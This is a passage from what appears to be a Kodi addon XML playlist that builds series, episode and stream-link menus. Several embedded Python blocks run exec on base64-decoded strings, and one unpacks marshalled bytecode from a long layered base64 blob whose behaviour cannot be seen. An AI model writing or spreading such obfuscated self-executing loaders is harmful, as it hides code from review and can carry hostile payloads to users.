cGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFZSQUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHpUbFJWZDA1dFdYcE5SRmsxVG1wRk1rNXFWVE5OYlVrelRVUktiVTE2UVRCYVZGSnFUWHBuZWs5VVVYaE9Na1V5V2tSak1FNUVZekJaYWxrMVRYcFZlazE2VlRCT2JVMHlXbFJXYUU1VVl6Qk5lbGswVG1wTk1VOVVVWGhPYW1jd1dsUk5lVTVxVFRGUFJGRXlUbXByTVUxVVl6Sk9WRUV5VDFSamQwNUhSVE5QVkZwcFRucFZNVTFxV1RST2VtTXpUVVJqTkU1SFdUQlBWRlUwVFhwamVWcHFXbXhPUkUxNlRXcFpNazVVV1RGUFJGSnFUbFJKTWsxVVRUTk9hazB3V21wamVFNXRUVEJhUkZFMVRYcFJNazFxWXpCTmVtZDZUMVJqTWs1dFZUQmFWRmw2VG1wWmVWcHFXbWhPYlUweVRtcFJlazE2U1hwT2FsbDVUVzFKTWs1RVl6Sk9lbGw2VG5wa2FFNUhVVEZOUkVwdFRXMVplazFFV1RSTmVrVjZUMFJOZVU1NlJUSk9hbGt5VGpKRk1VNUVaR2hOYlZsNVdtcFpNRTVFWXpKYVZFMHpUWHBqTTA1cVdYbE5iVWt6VDFSTk5FNTZXVE5OUkUwMVRXMVpNVTFFVlRCTmVsRXlUMVJLYVUxdFdYcE5SRkUxVGpKRk1rOVVUVFZOZWxWNlQxUktiVTVxUlROTmFtTXdUbXBKZVZwcVRYcE9ha1Y1V1dwS2JVMXRXWHBPZWxKcVRYcE5lazE2VFROTmVsVXlXWHBaZWsxdFdUTk5hazB4VG5wRk1VOUVXVEJPYWxreFRsUmFhRTU2V1ROT1ZGa3hUbGRGTWs1VVkzcE9SR2N4VFhwWk5VNTZTVE5PVkZKcFRucFZNVTFFVW10T1ZFMHlXVlJqZWs1VVp6Rk9lbGsxVG5wWk1scFVUVFJOZWxVelRXcGFhRTF0U1RCWmFsbDRUWHBGTVU1RVdtdE5lbU14VGxSWmVVNUhSVEJhVkZFd1RtcFpNRTE2VW1wTmJVa3pUbFJhYkU1RVdYcE9ha3BwVFhwVmVrNUVVVEpPYlZGNlQxUlZNMDVFWnpCT2VsVXdUWHBKZVZscVVtaE5lazB6VFdwU2JVNTZVVEpPYWxKclRrZEZlazVVV1hsT1ZGRXhUMVJOTkUxNlJYcE9lbU0xVFhwcmVrMXFVbXRPUjBWNlRtcE5ORTVYUlhwT2VsSnRUbFJyZWsxcVZUVk9la0Y1V21wU2FVNXFSVE5QUkZrd1RrUmpNMDFxU20xT2VsRXhUbXBSTTAxNlRUTk9hbHBzVGtSck1GcHFUVFZOZW1jelRucE5NazVVWXpKT1JGSnRUa2RGTVU1NlkzaE9SMUV5V1ZSU2FVNTZSWHBQVkdSb1RtcFZNMDFFVlhsT2Ftc3pUbXBSTUU1dFNUTk5WRTEzVFhwTk1FMXFWbWhPUjFsNlRVUlNiVTE2V1RGT1ZGbDRUVzFKTTA5VVZURk9lbGt3V21wak0wNTZZekJaVkdNd1RrZEZlazlFWTNwT1ZGa3dXa1JSTkU1VVRYcE9ha3B0VGtSUmVrNTZXbXhPYlVreFRtcGthRTVxU1ROT1ZGSnBUa1JqZVZwcVkzcE5la0V6VFdwYWJFNXFSVEZPYWxsNFRXMUplazVxV1RCT1ZHc3pUa1JqZUUxNlJYcE5lbEpvVGtkRk1VNXFXVFJPVkVFd1RtcFplRTE2WXpGTmFrMTRUbXBuZWs1NlVtaE9lbU13VDFSWk1rMTZaekZPZWxFMVRrZEZlazlFVlRWT2JVVXpUa1JWTTA1NlVUTlpWRlYzVGtkUk1VNXFXVFZOZWxVelRucFpORTVVVVRKWmFsRjVUbnBqTWs1VVl6Sk9iVWw2VDBSUk1rMTZhekpQVkZwcVRucFJNbHBxV1hsT1JFa3hUVVJWTTA1dFRUTk9SRTB4VGxSak1sbHFZek5OZWxFd1QwUk5lazVIVFRKWmFsVjZUbXByTWs5VVdtdE9WRWt3VDBSamVVNUVSVEZPZWxFMVRYcE5NMWxVV1hoT1YwVXpUMFJaZVU1RWF6SmFhazE0VG0xUk1scHFWWGhOZWxreFRWUlJlazF0U1ROTmVtTjVUa1JGTVZsVVdtbE9iVVV3VGxSS2JVNUhUVEpaVkdNeVRrUm5NMDU2V1RWT2Fsa3hUMVJWZWs1RVRYcE5lbEpzVGxSbk1FMXFZelJPUkVreVdYcFNhazV0UlRCTmFtTXhUbnByTWxscVdUTk5lazE2VFdwU2EwNXRWVEZOUkdONlRucE5lazVxWTNwT2Ftc3pUMVJSTVUxNmEzcE9hazB4VGxSSk1rMXFVbWhPUjBVeFRXcFZlVTVVWnpCYVZGRXlUVzFKTWxwcVVURk9lbFV6VG1wWk5VNXFWVE5OUkZsNlRucHJNVTE2VFhsT2VrRjZUbFJWTkU1RVp6Tk9WR015VFhwRmVWbHFXVEpPUkdNeVdsUmFiRTVVU1RGTlZGSm9UbFJuTVU1RVVYcE9SMWt5V21wWk1rNXRTVEpaZWxFelRXMUpNRTE2VFROT1JGa3dUa1JhYWs1SFJUQmFSRmt4VG1wTk1VNXFUVEZPYlVVeVRtcFZlVTV0U1ROTlJGVXhUbnBSTUU1VVRUUk9SRWt6VGxSTmVVNUVWVEpPUkUxNVRsUkZNbGxVV214T1ZFVXlXbFJOTUU1SFRURlpWR00xVFhwSk1rOUVaR2hPZW1zelRucGpORTVFWjNsYWFtTXdUa1JGTWsxcVl6Tk9SRlY2VG5wVmVVNUhUVEZOYW1NeFRtcGpNbHBVVFhwT2VtY3pUbXBaZWs1RVRUSk9WRnByVGtkWmVrOUVWVEZOZWxVelRWUk5NazVFV1hwT2Vsa3dUbFJWZWsxNlRYbE9iVTE1V21wak1FMTZVVEZPYWtwcFRucE5NMDlFVlRSTmVsa3pUbnBhYkUxNlVUQlphazAxVGtSWk1VMUVUWGxPUkZGNlRYcE5lRTVIVFRKYWFsRXdUbFJCTTA1VVZYbE5iVmt5VDFSVmVFMTZUWHBOVkZrMVRYcEpNMDlFWTNsT2VtY3dXWHBTYlU1SFVYbGFhbU0wVG1wRmVrMXFVVEJPYlZWNlQwUlNhRTVIUlRGTlZGSnFUVzFaTVU1NlVURk9hbGt6VFVSTk5FNUVSVEpPVkdNMFRtcEpNMDlVWkdoT1ZHY3dXbXBTYkU1cVp6RlpWRTAwVG1wbk1VOUVUVEJPVjBWNlRYcE5ORTVVWXpGTlZGcHNUa1JWTUUxVVkzcE9iVTB3V2xSTk0wNTZZekZQUkUwMFRrUmpNVTVFV1RGT2JVa3dXbFJOTlU1dFNUSk9hbFpvVFhwSk1FNUVTbWxPUkVVeFRucFpNVTVVWTNwT1ZGRjZUVzFaTUU1VVZYcE9WRlY2VGxSTmVVNVVWVEpPVkZWNVRtMVZlazU2VW1sT2FsRjZUV3BTYkU1SFNUSk5hbHBxVGtSWk0wNXFWVFZOYlVrelRVUlpNazVVWXpKWmVtTXhUbFJOTVUxRVRUTk9SMGt6VFVSWk1rMTZaekJPUkdONVRucFZNVTVVVVhwT2JVVXlUVlJSZUU1VVVURk9SRnBzVFhwQk1GbDZVWGxPVjBVeVRWUmplVTE2VVROTmFsazFUa1JGTUU5RVVUTk9WRkV6VG5wYWJFNXFUVEpPVkVwcFRsZEZNazFxVlROT1JHY3lUV3BSZUU1dFZYcE9WRkUwVGtSck1GbHFVVE5PZWsweVRtcFpNVTVFVVRCUFJFMHdUbXByZVZscVRUUk9SMDB4VFVSVk1rNVVSVE5QUkUwelRYcFZlazlVV21oT2VsbDZUV3BqTkU1NldUSlphbFY1VFhwVk0wOVVWWGhOYlZreFRYcFNhMDVVVVhwUFJHTTBUVzFaTTA5RVZYaE9hbGt5VFdwak5FNTZhekJPVkUwelRsUkpNRTVVV21sTmVtY3dUa1JTYlU1NmEzcE9hazE0VG5wWk1rNVVVVEZPZWxsNlRVUldhRTVIVFROT1JGcHRUa1JSTTA1cVRYZE9Na1V5VDBSVk5FNUhSVE5PZWxVMFRrUkZNMDVVVFRWT2VrMHdUbXBLYVU1NlRUQmFhbFV6VGtSck1GcHFVVFZPUjAweVRYcFJNVTU2V1hwT1JGVXpUa1JaTTA1RVZUVk9lbEV3VGxSVmQwNXFWVEZQVkZWNVRXMVpNVTlVVlRST2VrRXdXV3BaTVU1NlFYcFBWRTE2VGxSak1sbHFXbWhPYW1jeFRVUlZOVTVFUlhsYWFsRTBUbnBGTTA1Nll6Qk5lbWN4VFdwTk5VNXFhM3BQUkdNelRtMUZNbGxVV1RST1JFbDZUWHBTYlU1VWF6Tk5SR015VG1wUk1rNVVVVE5PYlVVeVdWUlNiVTV0VlRCYVZGRXpUbFJGTWsxVVZUUk9SRWt3VGtSS2JVMTZTVEJOYWxrd1RucG5lazU2WTNkT1JFMHlUa1JSTVU1cVJYcFBWR013VGxkRk1GcFVVWGxOZWxreVQxUmpNRTVxVVRKTmVtTTBUWHBqTTAxNlVtcE9hbGt4VFhwUk1VNXFXWHBQUkZwcFRucEJNVTVVVVhsTmVtY3pUVlJhYkU1VVNYcE5lazB4VGxkRk1WbFVWWGRPYWxsNlRrUlJlRTV0UlhwUFZGazFUbXBaZVZscVdUVk9WMFV5V1dwak1FMTZTWHBOUkZwc1RucG5NRTVVU20xT2JVa3dXa1JOTlU1NmF6Sk9SRlUwVG5wck1VNUVUWHBPZWxFd1RWUlJORTVIVlROTlZGazFUbXBuTWxscVRUTk9lbU13VDFSTk5FNXRXVEZPZWxWNlRrUlpNazVVVlROT2VrRXhUa1JSZUU1NldUQmFSR041VG5wck1scFVXVEZPUjBsNlRrUmFiVTVVVVhsWmFsRjVUbnBSZVZscVkzbE9SMUV5V1dwS2FVMTZWVEJPZWxreVRucE5NRTE2U20xT2VsRXdUa1JWTkUxdFNUSlphbGw2VG0xTk1scHFTbTFOZW1zeFQxUlJNazF0V1RGUFZGRXdUbXBaTWxscVVUSk5iVmt5VFdwWk5VNUhXVE5OVkZVMVRtcFZNazE2VVRKT1IwMHlUbXBaZWsxNlJUQlBSRkV6VGtSRk1rNXFVVFZPVkZWNlQxUlNhVTVVWjNwT2Vsa3pUa2ROZVZscVZYbE5la1V4VFdwVk5FNXRTVEZOUkZWM1RYcEJNRnBFVW0xT2VtY3dUVlJaTWsxNlFUSk9lbEpwVFhwTk1FOVVWVEJPZWxFd1RXcFplVTE2U1hwUFJGcHNUa2ROTUU5VVZYaE9hbEV5VDFSUmVrNTZXVE5PYWxWNFRtMUplVnBxVW1oT1ZGa3lXV3BqZWsxNlNURk5ha3BwVFhwUk1GbDZUVFJPVkdjelRrUlJNazV0VlhwTmFsSnJUVzFKTUUxcVZUUk9lbXN5VG5wak1rNUVaekZPVkUwelRYcEpNVTU2Vm1oT1JHdDZUMVJqZWs1VWF6Sk5hbGsxVGtSbk1VMUVVVEZPYWxVeFRrUlpNazVFUlROUFJHTjVUbFJWTUU1cVNtbE9WRlV3V2tSak0wNXFXVE5OVkZFMFRYcFJNbHBxWXpWT2Ftc3hUVVJTYVU1NlozbGFhbU16VGpKRk1VOUVTbTFPVkd0NlRVUk5NMDV0VlRCTmVsbDZUbFJGTWs1cVZURk9SMDE1V21wTmVrNVVTVE5PVkZwcFRYcEplazFVV1RST2FsRjZUVlJWTkU1RVRUTk9hbU13VGtSTk1sbFVUVEZPVkdzeVRucFplVTE2VlRCTmVrcHRUbnByTUU1NldteE9SRlY2VGxSYWFVNXFZM3BPVkUwelRucHJNazU2V214T1ZHc3dXbFJWTVUxdFdUQk9hazB3VG5wSk1FNVVWWGRPZW1jeFRrUlNiRTE2UVRGTmVrMTZUbFJuTUZwVVdURk9SMVV4VFZSUk5FNTZTVEJPVkZKc1RtcFJNMDVVVW0xT2FtTjZUMFJaZWs1Nll6Tk5hbU0xVGtSRk1rNVVZelJPUkZWNlQwUlZlRTVVVlhsYWFscHRUWHBqZWs1RVVtaE9lbGt4VDBSS2FVNUVWWHBQVkZsNFRtcG5NVTlFWTNwT1JGRXlUbXBhYVU1dFZUTlBSRXB0VFhwRk1FNVVTbTFPUkZrd1QwUkthVTVVYXpCTlZFMHdUa1JaTWxwcVRUSk9iVWw2VDFSWk1VNVVSVEpPYWsxNFRrUk5NbGxxVFRKT2JVbDZUV3BqZDA1NlNURk5WRmt4VG1wVk1VMXFWWGROZWtsNlRYcE5NazU2U1RGTlJGVTBUbFJWZWs5RVZURk9SRWt6VFdwWmVrMTZRVEZOUkZwc1RtMUZNVTlVWTNoT2VrRXlUbXBhYWs1RVp6Sk9WRlV4VGpKRmVrNUVXVFJPZWtsNlRXcFJlVTVxV1ROTmFsSnBUbXBWZWs1cVZYaE9hbGt3V2xSWk0wNXFVWGxaYW1Nd1RsUkpNMDFxVFhwT1Iwa3pUVlJSTlUxdFNURk5hbFUwVGxSTmVrOVVXWHBPUjAweFRXcEthVTU2VVRGTlJGa3dUbXBWTWs1VVVteE5lbXN3VDFSUk1VNXFVVEJPVkZVeVRXMUpNVTVVVW1wTmVsa3lUMFJOZUU1SFRURlpWRTB6VG5wRk1GcEVVVE5PUkZVd1QwUk5NVTVFV1RGT2VscHBUbXBOTTA1NlZYZE9la2t3VGxSU2JVNXFUVEpOZWxab1RYcFZNRTlVV1RKT2FrMHpUVVJqTWsxNlp6Rk9SR015VGxSWk1rNUVWVEpPZWxrd1RWUlZkMDE2VlROT1ZHTTBUWHBGTVUxRVkzZE9SMVY2VDFSTk1FNUhUVEpPVkUxM1RtcG5NRnBxVFRST1IwbDZUbnBWZVU1cVZUSlBSRmw1VGxkRk1VMXFWVEJPYWtreFRtcEtiVTVFVFRGT1JHTjNUbFJSTWxwVVZUSk9SMDB5VG1wUk5VNUVaM2xhYW1OM1RrZEZNMDVFVlhoT1ZFRjZUbFJWZUU1RVp6SlplbEV5VFcxWk1scHFWbWhPZWswd1RsUlpNVTVIU1RGT2VrMHdUbTFaTWsxcVZUTk9hbGw2VDBSTk5FNVVVVEphVkZVeVRYcG5NVTlFVFRST2Vsa3lUbXBTYlUxNlFUSk9hbEV4VGtkRk1rNVVUWGxPUkdONVdXcFpORTE2WXpOWmRGVVFBQUJIU0ROQmQwUXhURWRhYlVGdGVEQkNVWEJzUVZGd01FSlJTR3BCVVZZeFFrZElNbHB0VmpGYVIwZ3lRVEpTTUVKSFJEQmFla3d4UVhkTWJWcHRlREpCYlVneFdtMTRNazFSVERKQlVYQXlUWGR3TkZwdFNERkJVVmQ2UVcxSU1FeEhUREZCZDFveVRIZHdhMEZVVmpOTVIxcHJRWHBJTUVKUlJYaEJTbEp0V25kSU1FRjZWakpNUjFvd1FVZElNa0pSY0ROQlIzUXlRVkZJYkZwdFJETkJkMFEwUVhkTU1VRkhTREphYlZKdFdrZGFNa0ZIY0cxQ1VYQnNRVlJhTVVKUlREQkJlbFl4V2tkd01rRnRjREJCYlZwdFFVZGFNa3hIU0ROQmVsb3pXbEZOZFVGSGRESk1kMW95V20xU01GcHRTR3BCZDFvd1RHMXhkVUY2VmpCYVIwd3dXbTFXYlZwSFJETmFiWFF5VFhkTmQxcHRTREJNUjNCclFYcFdNMEZSUlhwYWJYZ3dUSGRNTTBGUmRERkJkMGd4V20xYU0wSlJTRFJCYlVnelFWRmFNRUZVVWpKTlIwMTNRVWRhTWsxUlRYWkJkMXBzVEhkd2FrRnRURE5CUjBSc1dtMU1Na3hIVEd4YWJVNHhXa2RJTVZwdFRERmFiVXd5V20xd01VRlJWM1pCU2xJd1RWRkZlVUZIU0ROQ1IxcHFRVWQwYlZwSFNHMUJlbEp0V20xd2EwRlJVbXhNZDFvd1FXMU9iVnB0UkRGQmQwUnRRVzFJTkVGSFZqSkJSMDE2V20xYU1rSkhSR3hCZDBneVRIZElhMEYzV2pKTWQwMTFXbTFTYlVGM1NEUmFiVTR6V25kYU1rRlJlREZCZDFwcldtMVdNa0YzVEd0QmJVUXlUWGRNTWxwdGVERkNSMGcwUVcxU01WcEhXakpCUjBRelduZFhla0ZVUkRCTlVWZDJRWHBXTVVKSFJERmFiWFJ0V2tkd01rRlVVakJNZDNBeFFYcEVNMXB0VEcxYWJWSXdRa2RGZWtGVVZtMUJiVXcxUVcxYU1rRlJXbXhhYlhBeVdrZHdNVUZIVEcxQ1VVd3pRVkZFTTBKUlJEQmFla3d4VEVkeGRWcHRUREJNUjAxNVFYcElNMEZIY0dwYWJYQXdRVkZ3TWtGUmVESkJkMHh0UVZGd2JVRjNSWHBCZDBnelFXMU5kVnB0U0cxQlIwUnRRVkYwTWsxSFJEUkJkMFF5UWtkSWFscHRUREpNUjAxNVFVZE1NRXh0UlhwQlIzUXlRa2RJTkVGVVdqSk5kM0YxV20xME1FeEhXakJhZWxZelFYZGFhMEZSU0RKQlVVUXlRVWRXTVVGUlNHcEJVWFF6UVZGYWJFRlJkREZCZDBWMVdtMTBNa3hIY0d0QmVsb3pXbTFOZFZwNlZqRkJSMGcwUVhkTU1WcEhXakZCUjBRelFYZEVNa0YzU0RKTmQwZ3pXbTF3TUZwSFRYVmFiWEF6UVhkRmRVRlJTREpCZDB3d1FYZDBNVnBIY0RKQmJVZ3pRVWRNYkVGSFdteE5kMGd4UVhwU2JFMTNjR3RCVkZadFFXMXdha0ZIVGpCTlVVaHFXbnBXTTFwUlNHcGFiWGd5UWxGTU5FRjZTRzFCUjAxMlFWRk1iRXgzVERSQlIzQnRRVkZYZWxwdFRESk1SMWQyUVhkNGJWcEhWM1phZWt3eVFYZE5lRUY2U0cxQ1IxbzFRVzFNTWt4dFRERkJla2d5VFZGTU1rRnRVakZhZDBReVFXMVNiVUZIU0cxQmQzUXpXbmRFTWtGNlVtMWFkMXB0UVhkU2JWcFJXalZCZDFJd1RHMUlha0ZVV2pOQ1VWb3pRWHBTTVVGUlJYaGFiVlp0V2tkTmRrRjNlREJhYlV3MVdtMU9iVnAzU0cxQmVsWXdUVWRhTWtGdGNHMWFSMXBzV20xV00wRjNURFZCUjBodFFsRkZlRUZIUkRCQ1VVMTJXbTFNTTB4SGNHeEJiVkl5VEcxd05VRXlVbTFhUjBWM1FYZElNVUpIV2pGQlVWWXpXbTFJYWxkcU1GaHhWVmRqYjNwNU1ISkdUamxXVUhCdGIzZDBOVXd3TVZWdVNERnVia2x4ZVVaNlRXdEpVakEwVEVvMGJVd3hkV0ZOZDFkRFRESTFURUpSZVdwR1lVRk1SRWQxVEVWSFNYbGFkMEZOUkhsd2JVeEpSV3hJTUdkNWNVdDBNRUV5ZFU5Wk1HTm5Sbmh4TUc5aGNHbHZiVUZTY2xOMVQzQXlUVlZ2TVVWaWIwaE5XbkI2U1dseVMyTkpXbnBqUjBsVlYwOXZTMFZMYjFGRlEweExUVVZDVVhSc1JFZzVOa0Y2U1Zwd1IzUXpRVWxUU1c1dGVETkZlR05HY0cxRlkyNVJVMlZ2TTJKbGIxUnJTa2gzZFZweVUwdzBTVkpOVFUxVGRXVnZkM2syYmpOSmJWcFVRVkJhUjNGMlJWRjVhVzkzVG0xQlNVVlVUVEpNTVVWVWNWRk1kM1JxUVROeGJYRkxUVkZJZDA5bFNXMU5Va3BIUVZoeFVuQXljVzFUTkc5U1NWbHhkM0JsVEhvNGEzRlNkVkphUjAxbVdsRkZWRzlJTVc1dVNFMUlTRWw1TVVsTFFXaEhlRUZLUjBoMWRtOHhTVWh1VVZkbFFUSnJVRVpSVDNwTWQxTnBRVXA1VmxwSFRtbEpNRFZOYjFBNVNFWjZjVEpGZDNGRFFrdElhVzVoY1hWTk0xWXdjRWRJYTB3elRETklZWFJwYjNwbWJVY3dXakZCZVZkSlJqSkpTa0ZWWTBKd01uaHRRVEpOUWxwdFRqVkJlRmRIUnpGVGRsa3lUVEJ1UjA5V2NFbFBiVUV3YTBkQ1ZHZEJjVlJhTWtGVFNXRkpiWGt6UmtsU2JFbDZVM3BJVlVsaFJuZFBTa1l5VFVSYU1sTkxSak5FTTFwNVRVMVpiVTlMVEVwalNFUjNjWGhGVkd0blFrbEJlRVJIVERWeWVuQmxibEppYlhCdFNVbEhNbE5qUm5oblkwUXlPR2x1YlhsaVJrbFhRVVZLUVc1TlVuVkpRVEpKWlhCdFdqRk5NM2sxU0RKWGJYQjJaakpKVWxKc1FYcEJXVUZ0VFRKeE1VMTVSMGhyTlZwM1FVMXlZVmRKUVhvd05FWjRhbXhDVWxkR2NWSndOWEpKY1ZWTlNHZFhSVXRQTlVKSFYwVk1NR00wU2twalkwUjZTVlpOVTNGWWNFWm1hMWt4VFdOeWQwRkljSGhuYTBKUmRXWkVTRWxhU25oWFkwWkxSV0pGWVUxdWJtRlRORUV3Y1V0dk1qaGxjSHB3TUVKVlQxaE5iWEZQUVZOWFowaDZNVkZLZDFOamJqSXhRVXBLT0ROQk1EQTBTa3RFTUc4eFRXUnhlbmswV2pKTk1sa3dPREZ2U1VGTWNURk5ZbHAzZFZwS2VHTkVjRlZTTUVwU1ZtcE5iWEYxYm5wMU1YRktjVWhLU1VGbGNFdGpOa1pHWjBSdlVrRllSMHBuYWtwTFYwMU1Na0ZwU25sRlVFMXNaalZKZURGM2NFcEVha0ZVVjFsQlNHTnFSMUpNTlZrd2RHeEhTazE2V0cxRmEwcExTV2RKU2psU1NURlhNbkV3UVc1eGVWZDNRVWR4VVVoS1NXMUZNakYxUlhkYU0wUjRUVzFITWsxWVJFZDRiRWRWVWpSRlVtY3lXREoxUkVwNk9USkpVMU42Y25sSVpVRXdVbXBhZURGVVJsVk5OVzVJUlhoSFZVOWxTa2R4VDBjemNXNXhNMFUxY21GWGFuSkxjV3RZYlUxblNERmplVWw2Tlc1QlMzbGlUVkY1Ulc1SFFWbGFTbkUxY25vNE5YQnRSR2xNTURGcFFrdFRZMjk2YW1wRmJVRmhSVEpyU1c1NFkzbHVTbWRxUkhwbllVSlVaakZOZVZkUVFURmlNVnBSVEd4SVZEVkpTa3BCTkc5NlpteEVNVWhzV0ROamJFSktZMGh1U25Sc1RFdFdiVWt3VFdsQ1NERkJRVE5TYWtFeFQwUnVVVkl3V21GQk5FcEhWMlZ5ZWpGWGIwdFRXbkV5VmpOWk1HTXhXbnB4ZDI4d2RVdFpNVWxwVFRGU2EwZ3lVM2xIU0UxUVdUSXhNa0V6VjJaeWQzVnVXbm81TW5KNlRETkdWREZwUldGU01XOXRTVXRCZGpodFRYaGpZbTloU1VSQlNYRk5Xak5FTTNGS09VRnZWRTFxUkhsMVVIRjVUVkpKZUhsU1dtMTVaMFJoVTJsYVUwNDFRVzFOUTBWdFRXMXhTR05xU25weFVVaEtkV3R3UzBSbFJqQkVhMWh0U1Zwd01HdERUWG80YlhCVGRVdEVkMGhzUldGVGFYQlNVMmRHVTBsUFRVaHhia1l6VFU5TlIzRmxXREExTlZwUmVYZEtTVVZDV1ROallVRlJRWFZNU1hsaldsRkJhM0ZWVDJWS2VsSTFXREpCWWtGTFRXeHZla3cwV0RKMVpVMXRValZOVkhWVVdqTmliWEpVZVVoRU0zUnNSSGhJTWtRd2EwTmFSM2xaUWtwaU1rZFNUVmh2VW5GYWIwdFRObko0WjI1TlZERkVTRlIwYVVWNVdqVnZiVll3YjBsNE1XOVNNVTF2YlVGRlJUQkJhRWhzT1ZkQ1ZIQTBSa2xYYkVsVFRXcHVSMDlpU1V0V2JFVjNjVE52VTNCcFJWTmpRMGN3Y0RGdVZEVk1iMGRFTVhBelFWQkVNa0ZyUjJGME1GcDZNWHBNUzFJMVFrcHhaazFWVjBKYWJVaHBSMVZUU1ZreVJYbEVlakV6UVhwQmFrcExZMjFNTTJOR1NGSTFVVnBSUVhkYVZFbHRUVlE1ZFVsU1p6TkZWVmRCY0hwTlFYQkxWbVZIVVZjemIxUjVTMEY1ZFV0QlIzVnJSa3RYYVhCNVFVUklVMW96Y2t0eFMwZDZOV2xNU21kaFRESXhla3BLWmpGeFNXTnRjVVk1UzAxVVRERnVlbE41U1ZKak0wMVVNVnBKVWtGa2JsSnhZM0F3WjJWSFNWTjVSek5QUjI1aFFXdHllalZ0U0VsSllVeEpTVXhCVkhWSFJIcFhUMFpLVjFaSE1qQXpibFJ4V0ZwM1RYcGFZVll4UlhwTU0wRXlaMEZZTWt4c2JsUjVObTUzU1cxRVMyTldRVEpFTlhCSWVHbHZVVk5IYjFGTk1YSkhkVTF3ZWpGTlJqTklaVWd5WXpaQk1YVlNUVkJuU1hGUVoxUktVblZsVERJeFNtOTRaMWxOVTNsc1JUQXhVRWxoUVdSdWVEVnFjRzFYVm5CNmVXZEtWRk16Y0ZCblNVRlZVMEZCVkRoc2NFdEZNMGhLUVVkTVNHZDFjVE5OWTBRd1VqQmFTMDExV2pJeGFVWXpUbTFKZW5GQlNUSjVNMjUzVDFWR1lYbGpjRXQ1Tm01SlFWRnllRmQyY1hwclZIQXlWMVJ5VWpFemNsUndNa2hVZEdsRVNFbGFSakpKYlVneU5WaEVlWEUxUVZGVGFFVkxXbXR4UjBGNVNUTjFZM0pHWm0xWk1VOTRiMjExZVVaUldtMXZVVkp0V0cxNVpXNVVRV0ZHTTFOUFFYcEpSMHA1VFhaTlMzQmxXVEpKYUVFeVkyWnhWRk5KYmtoblVFUjZSREpGU0VFMFIzaFdNRWN4ZUcxeWVuaGxSa2hOU0V4SVNHdEdNM0YzU0dGVFNIQkdaMjFKU0hsUGNsUlRWVVl6UlVWTlNuRmpRVkkxWWtsS1dqSkdVblZ1V2xKQllra3laakZOVWtsWmIwZFRNVVZLZURKSVZHdGljRkJuYkc1S2NVOUtTbkZGUWtsRU1rRlRjVFpKTWtGamNVZDFTWEozV2pWSE0zRjJSVWxKTmxwS2VYcHhVMGhsUlVoblRYRXlPVmxGZUZNelFsRlBVRnBUWW0xRmVVOTFXakpUWmtkNmVXSmFNMkpyY2xWUFkwWXdSVUZGZWsxNGNFaFRkM0pSY1ZsQk1tb3hXbEZQZGtsNlZqRkJlR3RoY0ZSV00zRXlNVFJhYlhFMVRUTlRabkZKVFZOeGVtdDFSMVY1VUhKU1JWUkJlRk5SV2pOMGEzQXlTV3hKWVVWVWNFZE5SRzUzUVdWYVUweHBiek5QVlVZelQyMU5Na3hwUWxSQlkyOVJSV1Z1U21NMFNFcDRiVUZJVjJOR1NsTkdiM2QxUmtWdFVtMUJVbGRrY2tkTlQwcEpWbTF3U0hGcVFsUkZaMEYzY1RaQlIwZzFSa28xZW5KNVUwOXhla2hzUkhwbldHOUhVbVZNTWpGNFJIaGpNMjlIUVdKR1NuRmtRa2RQV2tWVU5HMXdTRUZyY1RGVFkwVXdVbTFKUjFwcWJrZFhSVzVRWjFWSFNWZE5jVkpuYWtoaFV6SkdNVTR5UjB0TmRVaDVTREJ1YlhGbmNIcEpka0V5TlROdk1FeHRjRWxKTTAxS2RURkZSbVp0U0d3NWQwMHhlVlpZYlZkQ1dESTVTRWgyWmpOeFZERm9UVzF